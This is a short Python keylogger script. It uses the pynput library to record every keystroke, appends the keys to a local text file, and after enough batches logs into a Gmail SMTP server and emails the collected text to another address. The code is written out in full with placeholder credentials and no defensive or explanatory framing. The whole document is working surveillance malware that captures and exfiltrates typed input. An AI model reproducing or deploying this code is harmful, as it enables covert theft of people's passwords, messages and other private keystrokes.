from pynput.keyboard import Listener,Key
import smtplib

count=0
keys=[]
count2=0
def write2(keys):
    with open("test.txt","a") as tf:
        for key in keys:
            FinKey=str(key).replace("'","")
            if FinKey.find("space")>0:
                tf.write(" ")
            elif FinKey.find("Key") ==-1:
                tf.write(FinKey)
            else :
                tf.write(str(key))

def on_p(key):
    global keys,count,count2

    keys.append(key)
    count +=1

    print("(0) pressed".format(key))
    if(count >10):
        count=0
        write2(keys)
        keys=[]
        count2+=1

    if(count2>20):
        text=""
        for line in open('test.txt'):
            text+=line
        server= smtplib.SMTP('smtp.gmail.com',587)
        server.ehlo()
        server.starttls()
        server.ehlo()
        server.login('email@gmail.com','password')
        server.sendmail('email@gmail.com','emailto@gmail.com',text)
        count2=0

def on_r(key):
    pass

with Listener(on_press=on_p,on_release=on_r) as listener:
    listener.join()